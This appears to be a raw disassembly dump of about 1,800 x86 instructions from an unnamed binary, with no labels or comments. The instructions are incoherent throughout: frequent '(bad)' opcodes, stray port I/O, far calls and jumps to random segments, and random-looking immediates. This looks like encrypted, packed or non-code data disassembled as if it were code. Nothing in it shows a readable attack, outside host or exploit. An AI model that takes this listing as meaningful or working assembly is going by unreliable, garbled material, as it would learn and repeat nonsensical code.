  413ae9:	es stos DWORD PTR es:[edi],eax
  413aeb:	ffreep st(7)
  413aed:	mov    ch,0x9
  413aef:	loopne 0x413b55
  413af1:	push   edi
  413af2:	sar    DWORD PTR [esp+ecx*8],0x79
  413af6:	outs   dx,DWORD PTR ds:[esi]
  413af7:	dec    edi
  413af8:	bound  ecx,QWORD PTR [edx-0x3b]
  413afb:	xor    DWORD PTR [eax+0x1e69a9ae],ecx
  413b01:	leave  
  413b02:	xchg   DWORD PTR [ebp+0xd926db5],ebp
  413b08:	mul    DWORD PTR [eax-0x66010ed8]
  413b0e:	cwde   
  413b0f:	pop    ebp
  413b10:	sbb    eax,DWORD PTR [eax]
  413b12:	and    al,0x1e
  413b14:	(bad)  
  413b15:	pop    edi
  413b16:	aam    0x87
  413b18:	pop    edi
  413b19:	xor    BYTE PTR [eax-0x7b],ch
  413b1c:	or     eax,DWORD PTR [edx+0x71]
  413b1f:	xor    ebx,DWORD PTR [ecx]
  413b21:	sub    ch,BYTE PTR [esi]
  413b23:	mov    ah,0x7e
  413b25:	and    dl,BYTE PTR [edi-0x5af9c4e0]
  413b2b:	cmp    BYTE PTR [esi+0x3517060c],0xf3
  413b32:	pop    edx
  413b33:	xlat   BYTE PTR ds:[ebx]
  413b34:	mov    al,0x1
  413b36:	int    0xb2
  413b38:	fdivr  st(1),st
  413b3a:	or     al,BYTE PTR [esi+0x12]
  413b3d:	adc    BYTE PTR [edi-0xcefcce4],0xe3
  413b44:	xchg   cl,dl
  413b46:	and    dh,al
  413b48:	(bad)  
  413b49:	imul   esi,DWORD PTR [eax-0x22be6896],0x77
  413b50:	popa   
  413b51:	jp     0x413b6a
  413b53:	mov    dl,0xda
  413b55:	fadd   DWORD PTR [ebx]
  413b57:	pop    eax
  413b58:	dec    edx
  413b59:	add    bh,ah
  413b5b:	stos   BYTE PTR es:[edi],al
  413b5c:	in     eax,0xba
  413b5e:	in     eax,dx
  413b5f:	fnstenv [edi]
  413b61:	and    edx,DWORD PTR [esi+0x6e21d0b]
  413b67:	rcl    DWORD PTR [esi-0x3],0xfe
  413b6b:	xchg   edi,eax
  413b6c:	into   
  413b6d:	sub    eax,0x955cebc0
  413b72:	cdq    
  413b73:	mov    edx,0xa2912b3b
  413b78:	or     al,0x60
  413b7a:	pop    ebp
  413b7b:	push   ecx
  413b7c:	push   esp
  413b7d:	test   DWORD PTR [ebx+eax*2-0x71512d2d],ebp
  413b84:	daa    
  413b85:	nop
  413b86:	mov    ebx,0x982a94b3
  413b8b:	les    edx,FWORD PTR [esi+0x12]
  413b8e:	fidivr DWORD PTR [edx]
  413b90:	cmp    BYTE PTR [eax+0x50e75a11],al
  413b96:	sbb    BYTE PTR [edi+0x228d5666],cl
  413b9c:	mov    ch,BYTE PTR [edi]
  413b9e:	dec    ecx
  413b9f:	(bad)  
  413ba0:	sbb    bh,BYTE PTR [ecx-0xe]
  413ba3:	jg     0x413c08
  413ba5:	outs   dx,DWORD PTR ds:[esi]
  413ba6:	xchg   esp,eax
  413ba7:	rcl    al,1
  413ba9:	or     DWORD PTR [eax-0x2cee1c9a],ecx
  413baf:	inc    esp
  413bb0:	call   0x3845:0xdd5cbae6
  413bb7:	ja     0x413b49
  413bb9:	xor    DWORD PTR [ecx-0x5940caed],ebx
  413bbf:	outs   dx,BYTE PTR ds:[esi]
  413bc0:	call   0xbb714988
  413bc5:	out    0xe5,eax
  413bc7:	mov    BYTE PTR ds:0x401a28e7,ch
  413bcd:	inc    esp
  413bce:	retf   
  413bcf:	mov    BYTE PTR [eax+eax*8],bl
  413bd2:	or     dl,dh
  413bd4:	mov    ebx,0x99a3aace
  413bd9:	sub    edx,edx
  413bdb:	add    ecx,edx
  413bdd:	adc    BYTE PTR ds:0x67d67922,0x18
  413be4:	int3   
  413be5:	ins    BYTE PTR es:[edi],dx
  413be6:	jnp    0x413bd1
  413be8:	fidiv  WORD PTR [edi-0x47466268]
  413bee:	popf   
  413bef:	adc    edx,DWORD PTR [eax]
  413bf1:	jg     0x413b92
  413bf3:	push   esp
  413bf4:	leave  
  413bf5:	in     al,0xdd
  413bf7:	retf   
  413bf8:	daa    
  413bf9:	jge    0x413bd8
  413bfb:	ror    BYTE PTR [eax],0x8c
  413bfe:	xchg   esi,eax
  413c00:	xor    cl,bl
  413c02:	aad    0xf1
  413c04:	repz cdq 
  413c06:	int3   
  413c07:	sub    DWORD PTR [esi+edi*1-0x2d],esp
  413c0b:	rol    DWORD PTR [ebx-0x13],0x13
  413c0f:	xchg   edi,eax
  413c10:	stc    
  413c11:	loopne 0x413bef
  413c13:	fld    st(6)
  413c15:	imul   edi,DWORD PTR [eax+0x7d],0xcdb6d73d
  413c1c:	pop    ecx
  413c1d:	sar    edx,cl
  413c1f:	add    al,0xd9
  413c21:	push   ss
  413c22:	add    al,0xd8
  413c24:	enter  0xb7ff,0x32
  413c28:	das    
  413c29:	lods   al,BYTE PTR ds:[esi]
  413c2a:	xor    al,BYTE PTR [ebp+0x66]
  413c2d:	lods   al,BYTE PTR ds:[esi]
  413c2e:	pop    esp
  413c2f:	and    al,0x52
  413c31:	shl    DWORD PTR [edi-0x45928d2b],0x69
  413c38:	push   0xffffff9c
  413c3a:	jl     0x413bf0
  413c3c:	xchg   ecx,eax
  413c3d:	pop    esp
  413c3e:	sub    al,0x60
  413c40:	stos   DWORD PTR es:[edi],eax
  413c41:	clc    
  413c42:	add    eax,0x7e7bfa5a
  413c47:	jg     0x413bdb
  413c49:	jae    0x413c3e
  413c4b:	inc    eax
  413c4c:	in     al,0xe1
  413c4e:	cmp    eax,DWORD PTR [edi-0x6444c119]
  413c54:	out    dx,al
  413c55:	pop    ebp
  413c56:	jp     0x413c7a
  413c58:	or     eax,0xcfbb9ea6
  413c5d:	mov    edi,0xb1cce0d7
  413c62:	mov    esi,0xa0acb66f
  413c67:	sti    
  413c68:	je     0x413c58
  413c6a:	ret    
  413c6b:	push   esi
  413c6c:	sbb    BYTE PTR [eax+edi*4+0x5d684230],bh
  413c73:	jae    0x413ce7
  413c75:	and    al,0xab
  413c77:	in     al,0xc3
  413c79:	lods   al,BYTE PTR ds:[esi]
  413c7a:	(bad)  
  413c7b:	shl    DWORD PTR [esp+ebp*4+0x6f],1
  413c7f:	sti    
  413c80:	xchg   ebx,eax
  413c81:	mov    dl,0x87
  413c83:	outs   dx,BYTE PTR ds:[esi]
  413c84:	rol    DWORD PTR [esp+esi*8-0x70084f65],1
  413c8b:	xchg   esi,eax
  413c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c8d:	(bad)  
  413c8e:	call   0x54606ad6
  413c93:	in     eax,dx
  413c94:	imul   esi,DWORD PTR [eax],0x477b43a0
  413c9a:	cmp    BYTE PTR [edx+0x13],dh
  413c9d:	aaa    
  413c9e:	or     ecx,DWORD PTR [ecx]
  413ca0:	lea    edi,[esi+0x13]
  413ca3:	mov    edx,0x87aff09d
  413ca8:	jae    0x413c2c
  413caa:	xor    ebp,eax
  413cac:	lods   eax,DWORD PTR ds:[esi]
  413cad:	daa    
  413cae:	jnp    0x413d25
  413cb0:	sub    ch,BYTE PTR [esi]
  413cb2:	cdq    
  413cb3:	sti    
  413cb4:	aad    0x9c
  413cb6:	pop    ss
  413cb7:	neg    DWORD PTR [ebx+0x40]
  413cba:	in     al,0x5c
  413cbc:	jg     0x413d26
  413cbe:	shl    ch,0xdf
  413cc1:	mov    DWORD PTR [edi-0x298fdaf5],edx
  413cc7:	sub    DWORD PTR [edi],ebp
  413cc9:	pop    ebx
  413cca:	imul   eax,DWORD PTR [esi+0x51],0xffffff99
  413cce:	fwait
  413ccf:	daa    
  413cd0:	rol    BYTE PTR [esi-0x46],0xa5
  413cd4:	add    ecx,DWORD PTR [edx-0x8]
  413cd7:	or     eax,0x791873d0
  413cdc:	fdivr  st,st(2)
  413cde:	sub    eax,0xbf599291
  413ce3:	jnp    0x413cb7
  413ce5:	sbb    al,0x8f
  413ce7:	clc    
  413ce8:	cmp    DWORD PTR [edi*8+0x4957666d],eax
  413cef:	or     BYTE PTR [edi-0x1c],ah
  413cf2:	or     eax,0xfcb41ed9
  413cf7:	shl    DWORD PTR [ebp+ebx*4-0x20],0x29
  413cfc:	adc    al,0x36
  413cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cff:	ror    BYTE PTR [edi+0xb60861d],0x40
  413d06:	in     al,0x13
  413d08:	push   ebp
  413d09:	lods   eax,DWORD PTR ds:[esi]
  413d0a:	dec    edx
  413d0b:	fs push edi
  413d0d:	jmp    0xc3dc7b7e
  413d12:	(bad)  [edi+0x6a]
  413d15:	pop    eax
  413d16:	pop    ebx
  413d17:	sti    
  413d18:	retf   0xfee8
  413d1b:	push   esi
  413d1c:	scas   eax,DWORD PTR es:[edi]
  413d1d:	cli    
  413d1e:	cmp    BYTE PTR [ebx+eiz*1-0x2],dl
  413d22:	imul   edx,DWORD PTR [ebx+0x10],0xffffffd7
  413d26:	pop    eax
  413d27:	sbb    DWORD PTR [ebp+ebp*4+0x4e],esp
  413d2b:	mov    al,0xdb
  413d2d:	cmp    ebp,DWORD PTR [esi]
  413d2f:	sub    eax,0xdceec58c
  413d34:	imul   esi,ebx,0xffffff8b
  413d37:	stc    
  413d38:	mov    WORD PTR [bp+di],ds
  413d3b:	add    al,0xb3
  413d3d:	mov    ch,0x2
  413d3f:	add    DWORD PTR [edx],ebx
  413d41:	pop    eax
  413d42:	scas   eax,DWORD PTR es:[edi]
  413d43:	ret    0x8e27
  413d46:	je     0x413d40
  413d48:	ins    BYTE PTR es:[edi],dx
  413d49:	push   0x42a07807
  413d4e:	ds das 
  413d50:	mov    dl,0x46
  413d52:	sub    DWORD PTR [eax-0x26],esp
  413d55:	aas    
  413d56:	mov    DWORD PTR cs:[ebx],esi
  413d59:	aad    0x2c
  413d5b:	(bad)  
  413d5c:	fist   WORD PTR [ebp+esi*4+0x19]
  413d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d61:	aaa    
  413d62:	vxorps ymm5,ymm0,ymm7
  413d66:	mov    ch,0x7
  413d68:	or     eax,0x10e3ac70
  413d6d:	cdq    
  413d6e:	aad    0xa0
  413d70:	inc    eax
  413d71:	call   0xce07:0x49c6455a
  413d78:	scas   eax,DWORD PTR es:[edi]
  413d79:	sar    DWORD PTR [esi],cl
  413d7b:	sub    dh,ah
  413d7d:	jae    0x413d37
  413d7f:	push   edi
  413d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d81:	in     eax,0xf
  413d83:	xchg   DWORD PTR [edx+0x4d596dfb],edi
  413d89:	popw   ss
  413d8b:	mov    cl,0x5
  413d8d:	fs pop edx
  413d8f:	inc    ebp
  413d90:	ja     0x413d78
  413d92:	std    
  413d93:	sbb    ah,ch
  413d95:	sub    al,0xb0
  413d97:	mov    dh,0x97
  413d99:	jb     0x413d3f
  413d9b:	stos   BYTE PTR es:[edi],al
  413d9c:	xchg   DWORD PTR [ecx],edx
  413d9e:	imul   ebp,DWORD PTR [ebx+0x4d],0x76
  413da2:	ror    BYTE PTR [ecx+0x7cf1482],cl
  413da8:	pop    eax
  413da9:	pop    esp
  413daa:	cs cdq 
  413dac:	xchg   ebx,eax
  413dad:	test   al,0xcb
  413daf:	jg     0x413d59
  413db1:	pop    ebx
  413db2:	mov    esp,0x9b3b5e5f
  413db7:	cmc    
  413db8:	xchg   ebx,eax
  413db9:	outs   dx,DWORD PTR ds:[esi]
  413dba:	mov    esi,0xcda8e5bf
  413dbf:	xchg   esp,eax
  413dc0:	out    0x78,al
  413dc2:	mov    eax,0x88c120ef
  413dc7:	push   edi
  413dc8:	mov    ecx,es
  413dca:	cwde   
  413dcb:	(bad)  
  413dcc:	jg     0x413d83
  413dce:	aad    0x99
  413dd0:	pop    eax
  413dd1:	out    dx,al
  413dd2:	jmp    0xec19:0x3673a11b
  413dd9:	adc    edi,DWORD PTR [esi-0x13]
  413ddc:	adc    DWORD PTR [eax-0x4e6f1e83],ebx
  413de2:	jmp    0x413e1b
  413de4:	(bad)  
  413de6:	cs jae 0x413dd0
  413de9:	pop    eax
  413dea:	(bad)  
  413deb:	mov    edx,0x14066488
  413df0:	inc    esi
  413df1:	jo     0x413df7
  413df3:	ss fcmovb st,st(5)
  413df6:	fisubr DWORD PTR [ecx+0x26]
  413df9:	daa    
  413dfa:	sar    DWORD PTR [esi+eiz*2+0x34],1
  413dfe:	sbb    esp,DWORD PTR [eax+ebp*2-0x27]
  413e02:	pop    edx
  413e03:	pop    esi
  413e04:	fsub   QWORD PTR [ebp+0x79dc1167]
  413e0a:	xor    edx,DWORD PTR [ebp-0x71410659]
  413e10:	hlt    
  413e11:	and    bh,ch
  413e13:	push   cs
  413e14:	mov    ah,0xd
  413e16:	push   es
  413e17:	sti    
  413e18:	cld    
  413e19:	mov    esi,0x1a296cc1
  413e1e:	push   ebp
  413e1f:	lds    edi,FWORD PTR [ecx]
  413e21:	clc    
  413e22:	call   0xe68b845a
  413e27:	aad    0xe5
  413e29:	std    
  413e2a:	mov    bl,0xaa
  413e2c:	dec    eax
  413e2d:	or     ah,BYTE PTR [ebp-0x458998cb]
  413e33:	xchg   BYTE PTR [edi],bl
  413e35:	adc    ecx,DWORD PTR es:[edx-0x6a9f6f46]
  413e3c:	ficom  DWORD PTR [edi]
  413e3e:	xor    dh,BYTE PTR [edx]
  413e40:	pusha  
  413e41:	inc    ecx
  413e42:	inc    ecx
  413e43:	into   
  413e44:	cli    
  413e45:	icebp  
  413e46:	pop    ebp
  413e47:	jmp    0x5f69:0x9cfe0748
  413e4e:	mov    al,0x53
  413e50:	gs jge 0x413eae
  413e53:	sbb    ah,dh
  413e55:	inc    eax
  413e56:	fiadd  DWORD PTR [edx+0x349a806c]
  413e5c:	in     eax,0x10
  413e5e:	dec    edi
  413e5f:	xchg   esi,eax
  413e60:	push   0xb48812fb
  413e65:	mov    ecx,0x722ee183
  413e6a:	mov    esi,0x52d8a8b0
  413e6f:	lahf   
  413e70:	ror    BYTE PTR [edx-0x3c],cl
  413e73:	loop   0x413e26
  413e75:	daa    
  413e76:	lds    ebp,FWORD PTR [ebp-0x3eeb530f]
  413e7c:	cli    
  413e7d:	push   0xe1d68b6f
  413e82:	out    dx,al
  413e83:	jae    0x413e2a
  413e85:	sub    ch,dh
  413e87:	es sub eax,0xadc8b47
  413e8d:	cwde   
  413e8e:	cmp    eax,0xe34ffa87
  413e93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e94:	xor    BYTE PTR [ebx-0x2b],bh
  413e97:	bound  esp,QWORD PTR ds:0x39b3950b
  413e9d:	sbb    DWORD PTR [ebx-0x3e],ecx
  413ea0:	(bad)  
  413ea1:	fbstp  TBYTE PTR ds:0xbfa1
  413ea6:	pusha  
  413ea7:	test   ch,bh
  413ea9:	mov    ebp,0x62d7d2e1
  413eae:	mov    cl,0xc9
  413eb0:	xchg   cl,bh
  413eb2:	repz sbb dl,ch
  413eb5:	ror    BYTE PTR [ebx-0x3a63aed7],1
  413ebb:	lds    esp,FWORD PTR [ebx+0x34]
  413ebe:	inc    ecx
  413ebf:	inc    esi
  413ec0:	enter  0x7e2d,0x48
  413ec4:	ins    BYTE PTR es:[edi],dx
  413ec5:	test   DWORD PTR [edi-0xf],edi
  413ec8:	sbb    al,0xf
  413eca:	adc    eax,0x35225492
  413ecf:	push   eax
  413ed0:	push   cs
  413ed1:	adc    ebp,esi
  413ed3:	popa   
  413ed4:	test   esp,edi
  413ed6:	aad    0x18
  413ed8:	jle    0x413eb9
  413eda:	enter  0x3d5c,0xd8
  413ede:	ret    
  413edf:	mov    WORD PTR [ebx],ss
  413ee1:	cli    
  413ee2:	cmp    BYTE PTR [eax-0x50e480df],0xd
  413ee9:	jno    0x413f1f
  413eeb:	mov    BYTE PTR [esi],bl
  413eed:	pop    eax
  413eee:	dec    esp
  413eef:	arpl   WORD PTR [esi+0x6e],sp
  413ef2:	pop    edi
  413ef3:	test   DWORD PTR [edx],esi
  413ef5:	retf   0xdc9
  413ef8:	iret   
  413ef9:	lea    ebx,[eax]
  413efb:	sbb    al,0xb5
  413efd:	cmp    al,0xe1
  413eff:	mov    edi,0x61800693
  413f04:	cmc    
  413f05:	test   BYTE PTR [ebx],dl
  413f07:	bnd ret 
  413f09:	fmul   QWORD PTR [esp+esi*4-0x5dbf7ba7]
  413f10:	jmp    0xd439:0xcc3e73d7
  413f17:	out    dx,eax
  413f18:	daa    
  413f19:	jo     0x413f7f
  413f1b:	pop    edx
  413f1c:	icebp  
  413f1d:	jecxz  0x413f3b
  413f1f:	dec    ecx
  413f20:	and    esp,edi
  413f22:	repz popf 
  413f24:	mov    dl,0x9a
  413f26:	cs mov bh,0xd2
  413f29:	scas   al,BYTE PTR es:[edi]
  413f2a:	push   ebx
  413f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f2c:	xchg   esi,eax
  413f2d:	and    eax,0x3369cdb1
  413f32:	and    dh,bh
  413f34:	fstp   QWORD PTR [esi-0x66132564]
  413f3a:	mov    cl,0x73
  413f3c:	imul   edx,esp,0xffffff8f
  413f3f:	(bad)
  413f42:	inc    ecx
  413f43:	jo     0x413eca
  413f45:	dec    eax
  413f46:	cmp    bh,0xf9
  413f49:	inc    esi
  413f4a:	int    0xee
  413f4c:	mov    DWORD PTR [ebx-0x4d],ebp
  413f4f:	test   al,0xb4
  413f51:	out    0x8c,al
  413f53:	jge    0x413f6d
  413f55:	pop    es
  413f56:	dec    edi
  413f57:	in     eax,dx
  413f58:	jae    0x413f22
  413f5a:	xchg   edi,eax
  413f5b:	popa   
  413f5c:	enter  0x23f7,0x15
  413f60:	cdq    
  413f61:	das    
  413f62:	repnz mov esi,0xe5291dba
  413f68:	pop    ebp
  413f69:	test   eax,0xaaac02d5
  413f6e:	pop    es
  413f6f:	cli    
  413f70:	pop    ebp
  413f71:	xchg   BYTE PTR [edx],al
  413f73:	call   0x7a4:0x2a8cc9c5
  413f7a:	dec    ecx
  413f7b:	pushf  
  413f7c:	test   al,0x9c
  413f7e:	mov    eax,ds:0xcd15ee64
  413f83:	xor    BYTE PTR [esi+esi*2+0x356b603],ah
  413f8a:	(bad)  
  413f8b:	test   DWORD PTR [ebp+0x6280ec94],0xaf75c38c
  413f95:	mov    dl,0x8d
  413f97:	repnz inc esp
  413f99:	xor    BYTE PTR [eax-0x5a],dh
  413f9c:	adc    eax,0x1793952e
  413fa1:	xlat   BYTE PTR ds:[ebx]
  413fa2:	dec    esp
  413fa3:	pop    esp
  413fa4:	ret    0xe935
  413fa7:	xchg   edx,eax
  413fa8:	popf   
  413fa9:	loop   0x413f73
  413fab:	adc    bh,ah
  413fad:	mov    al,ds:0xba6faf23
  413fb2:	lods   eax,DWORD PTR ds:[esi]
  413fb4:	nop
  413fb5:	pop    ecx
  413fb6:	mov    edx,0x36fdd1dc
  413fbb:	pop    edi
  413fbc:	aam    0xd8
  413fbe:	push   ebx
  413fbf:	(bad)  
  413fc0:	jbe    0x413f55
  413fc2:	cmp    BYTE PTR [edi+0x5],ah
  413fc5:	pop    ebp
  413fc6:	jae    0x413f55
  413fc8:	sub    bl,ch
  413fca:	int3   
  413fcb:	push   edi
  413fcc:	test   al,0x25
  413fce:	inc    esp
  413fcf:	int3   
  413fd0:	test   eax,0x4085aa03
  413fd5:	xor    eax,0x76e07717
  413fda:	hlt    
  413fdb:	ja     0x413fdd
  413fdd:	jl     0x413faa
  413fdf:	lds    eax,FWORD PTR [eax+0x54]
  413fe2:	mov    DWORD PTR [ebx+ebx*2+0x338053c0],0x6c629f31
  413fed:	outs   dx,BYTE PTR ds:[esi]
  413fee:	and    ch,BYTE PTR [ecx+0x5b53e280]
  413ff4:	mov    esp,0x859e7e67
  413ff9:	nop
  413ffa:	cmp    BYTE PTR [ebx-0x5d],ch
  413ffd:	loop   0x41400b
  413fff:	mov    cl,0x2c
  414001:	dec    esp
  414002:	jp     0x413fb7
  414004:	shr    DWORD PTR [ebx],1
  414006:	stos   DWORD PTR es:[edi],eax
  414007:	push   ebp
  414008:	xchg   ecx,eax
  414009:	xchg   esp,eax
  41400a:	xchg   DWORD PTR [edi+0x4cd4dc4a],ebx
  414010:	rcr    BYTE PTR [edx+0x7fb64ff],0x7d
  414017:	(bad)  
  414018:	push   ecx
  414019:	and    eax,0xf9f4a852
  41401e:	nop
  41401f:	dec    ecx
  414020:	dec    ebp
  414021:	sub    al,0xde
  414023:	push   ebx
  414024:	enter  0x8c46,0xe2
  414028:	add    BYTE PTR [eax-0x39],al
  41402b:	mov    cl,0x68
  41402d:	jnp    0x414093
  41402f:	adc    al,BYTE PTR [edi+0x29f23562]
  414035:	cs xchg ecx,eax
  414037:	js     0x413fed
  414039:	pop    es
  41403a:	pop    esi
  41403b:	idiv   DWORD PTR [edx]
  41403d:	pop    es
  41403e:	pop    esp
  41403f:	pop    esi
  414040:	and    eax,0x658fcbe7
  414045:	loope  0x413fef
  414047:	nop
  414048:	xchg   edi,eax
  414049:	jo     0x413fd2
  41404b:	ins    DWORD PTR es:[edi],dx
  41404c:	outs   dx,BYTE PTR ds:[esi]
  41404d:	add    dl,ch
  41404f:	mov    esp,0x7fbcc8f9
  414054:	stos   BYTE PTR es:[edi],al
  414055:	fild   DWORD PTR [eax+0x0]
  414058:	pop    edi
  414059:	in     al,dx
  41405a:	leave  
  41405b:	lock push es
  41405d:	mov    ecx,0xd25b4014
  414062:	cmp    ebx,DWORD PTR [eax-0x65e34e9b]
  414068:	inc    eax
  414069:	fst    DWORD PTR [ecx+0x70]
  41406c:	test   eax,0x9edee8ea
  414072:	or     eax,eax
  414074:	pop    ecx
  414075:	and    DWORD PTR [ebp+0x7d],eax
  414078:	repz aam 0xe0
  41407b:	pop    ecx
  41407c:	in     al,0xd7
  41407e:	xchg   BYTE PTR [ebp-0x46],ch
  414081:	dec    esi
  414082:	pop    es
  414083:	ret    
  414084:	aam    0x5e
  414086:	cmp    BYTE PTR [eax+ebx*4],ah
  414089:	fstp   st(1)
  41408b:	stc    
  41408c:	inc    ecx
  41408d:	jmp    0x414014
  41408f:	push   es
  414090:	pop    es
  414091:	inc    ebp
  414092:	loop   0x4140d9
  414094:	push   ebx
  414095:	add    eax,0x28041808
  41409a:	sbb    al,0x4
  41409c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41409d:	cwde   
  41409e:	fs mov ah,0x64
  4140a1:	mov    bh,0xc4
  4140a3:	in     al,0x38
  4140a5:	jo     0x4140b4
  4140a7:	lahf   
  4140a8:	lds    ebp,FWORD PTR [ebp+0x48a096d7]
  4140ae:	jmp    0xa3856c53
  4140b3:	shl    DWORD PTR [edx+0x2a9da587],cl
  4140b9:	sbb    bh,dh
  4140bb:	push   eax
  4140bc:	mov    bh,0x34
  4140be:	mov    ds:0x42679a5a,eax
  4140c3:	sub    BYTE PTR [edx+0x3247607c],cl
  4140c9:	jo     0x41407d
  4140cb:	or     al,0x2a
  4140cd:	pop    ebx
  4140ce:	adc    eax,0x5d8f3163
  4140d3:	mov    ah,dl
  4140d5:	sbb    al,ah
  4140d7:	stc    
  4140d8:	push   ss
  4140d9:	ds std 
  4140db:	mov    al,ds:0x998bb1fd
  4140e0:	data16 je 0x4140b3
  4140e3:	das    
  4140e4:	fmul   QWORD PTR [ecx-0x1e]
  4140e7:	and    dh,ch
  4140e9:	mov    eax,ds:0x42b3f429
  4140ee:	mov    bh,0x60
  4140f0:	fabs   
  4140f2:	mov    ch,0x92
  4140f4:	push   cs
  4140f5:	sar    BYTE PTR [ecx],0x95
  4140f8:	fwait
  4140f9:	daa    
  4140fa:	push   esp
  4140fb:	ret    0xec27
  4140fe:	xchg   ebp,eax
  4140ff:	push   edi
  414100:	ss push esp
  414102:	out    dx,eax
  414103:	ss in  al,0xf8
  414106:	push   edx
  414107:	inc    edx
  414108:	aam    0x58
  41410a:	adc    eax,0xe2d5ed90
  41410f:	clc    
  414110:	(bad)  
  414111:	loope  0x4140d3
  414113:	jmp    0x4140ef
  414115:	aam    0x93
  414117:	stos   DWORD PTR es:[edi],eax
  414118:	push   ebx
  414119:	sbb    al,0x47
  41411b:	pop    ebx
  41411c:	test   DWORD PTR [edx+0x7e],ebx
  41411f:	addr16 sti 
  414121:	fstp   QWORD PTR [esi-0x6d]
  414124:	out    0xd0,eax
  414126:	shl    al,0x56
  414129:	ret    0x3254
  41412c:	jnp    0x414194
  41412e:	pop    ds
  41412f:	inc    ebp
  414130:	dec    ecx
  414131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414132:	(bad)  [edi-0x1f]
  414135:	adc    BYTE PTR [esi+edx*8+0x42c08b91],dh
  41413c:	xchg   WORD PTR fs:[edx],di
  414140:	js     0x414199
  414142:	xor    ebp,ebx
  414144:	push   edi
  414145:	cmp    eax,DWORD PTR [esi+eiz*4]
  414148:	adc    DWORD PTR [ebp-0xd37da5c],esi
  41414e:	rcl    DWORD PTR [esi+edx*4+0x22],cl
  414152:	jg     0x4141a9
  414154:	xor    DWORD PTR [edx],eax
  414156:	push   es
  414157:	pop    esi
  414158:	rcr    DWORD PTR [ecx-0x672642b6],cl
  41415e:	cdq    
  41415f:	push   ebx
  414160:	dec    edx
  414161:	and    edx,ecx
  414163:	push   cs
  414164:	sbb    esi,DWORD PTR [ebx+0x61]
  414167:	pop    ebp
  414168:	jns    0x414189
  41416a:	pop    ecx
  41416b:	aad    0x1
  41416d:	clc    
  41416e:	mov    ?,WORD PTR [ecx+0x21]
  414171:	es fs mov ss,ebx
  414175:	pushf  
  414176:	fstp   st(6)
  414178:	xor    edi,edi
  41417a:	popa   
  41417b:	ror    DWORD PTR [edx],1
  41417d:	jl     0x41418b
  41417f:	mov    WORD PTR [edi+0x35a0d688],?
  414185:	addr16 jg 0x414165
  414188:	jecxz  0x4141ae
  41418a:	and    DWORD PTR [edi-0x43af51f5],esp
  414190:	inc    ecx
  414191:	test   eax,0xae774b79
  414196:	nop
  414197:	sbb    BYTE PTR [ebp+esi*4+0x4a877b01],al
  41419e:	pop    ebx
  41419f:	or     DWORD PTR [edx],edx
  4141a1:	inc    eax
  4141a2:	ret    0x732c
  4141a5:	jno    0x414166
  4141a7:	mov    esi,0x78d33f2a
  4141ac:	adc    edx,DWORD PTR [ebx-0x7f]
  4141af:	inc    edx
  4141b0:	out    0x14,eax
  4141b2:	outs   dx,DWORD PTR ds:[esi]
  4141b3:	xchg   ebx,eax
  4141b4:	and    esi,DWORD PTR ds:0x8e24ecca
  4141ba:	(bad)  
  4141bb:	xchg   ebp,eax
  4141bc:	loope  0x4141f3
  4141be:	mov    bl,0xa3
  4141c0:	retf   0x94d2
  4141c3:	fs add al,0x45
  4141c6:	icebp  
  4141c7:	push   edi
  4141c8:	jg     0x414174
  4141ca:	jmp    FWORD PTR [esi]
  4141cc:	fs inc esp
  4141ce:	sar    BYTE PTR [ecx+ebx*1],1
  4141d1:	sti    
  4141d2:	mov    cl,0x47
  4141d4:	add    ebx,0xe0f9cfd9
  4141da:	ss (bad) 
  4141dc:	fdiv   QWORD PTR [eax-0x3991da83]
  4141e2:	mov    edx,0xdb47f94a
  4141e7:	xor    dh,0x8c
  4141ea:	ficom  WORD PTR [eax-0x59bd4192]
  4141f0:	pop    edx
  4141f1:	pop    es
  4141f2:	sbb    BYTE PTR ss:[edx+0x26f70040],dh
  4141f9:	mov    al,ds:0x6a09a000
  4141fe:	pop    es
  4141ff:	lea    ecx,[eax-0x62]
  414202:	push   0xc5a12d69
  414207:	adc    edx,esi
  414209:	jl     0x4141c5
  41420b:	xor    DWORD PTR [edi-0x52],ecx
  41420e:	mov    dh,0xc5
  414210:	push   edi
  414211:	mov    DWORD PTR [eax+0x73722db9],ebp
  414217:	lahf   
  414218:	loop   0x414242
  41421a:	cld    
  41421b:	cmp    BYTE PTR [edx+0xd],dl
  41421e:	pop    edi
  41421f:	cmp    ah,BYTE PTR [ecx]
  414221:	ror    DWORD PTR [edx-0xb],cl
  414224:	add    eax,0xe5a157ee
  414229:	or     esp,eax
  41422b:	xchg   esi,eax
  41422c:	cmp    BYTE PTR [eax+0x62],al
  41422f:	pop    eax
  414230:	or     DWORD PTR [ecx],edx
  414232:	lods   eax,DWORD PTR ds:[esi]
  414233:	sar    DWORD PTR [edx+0x2],cl
  414236:	and    BYTE PTR [ebx-0x1a],0x34
  41423a:	adc    eax,0xbe9b3d7e
  41423f:	retf   0x3d0a
  414242:	cmp    DWORD PTR [edx+0x3bc38d9f],esp
  414248:	xchg   esp,eax
  414249:	push   ds
  41424a:	in     eax,0x90
  41424c:	out    dx,eax
  41424d:	pop    ebx
  41424e:	ins    DWORD PTR es:[edi],dx
  41424f:	or     BYTE PTR [ebx+0x60],dh
  414252:	cmp    edi,edx
  414254:	in     eax,dx
  414255:	mov    DWORD PTR [ecx+0x75d02c17],eax
  41425b:	xchg   esp,eax
  41425c:	sbb    DWORD PTR ds:0x7cbf3433,0xffffff90
  414263:	rcl    BYTE PTR [edx+ecx*1-0x5c],0x53
  414268:	(bad)  
  414269:	mov    eax,0xbdd9f870
  41426e:	mov    edi,0xbf390ac8
  414273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414274:	outs   dx,DWORD PTR ds:[esi]
  414275:	retf   0x69b4
  414278:	fisttp DWORD PTR [esi-0x6c]
  41427b:	sbb    cl,0x20
  41427e:	cmp    DWORD PTR [ecx+0x268953ad],ecx
  414284:	pop    es
  414285:	push   ecx
  414286:	jno    0x4142a3
  414288:	(bad)  
  414289:	int    0xbe
  41428b:	aaa    
  41428c:	pop    ebp
  41428d:	imul   ecx,DWORD PTR [eax-0x63],0x9
  414291:	add    eax,0xbc245e6e
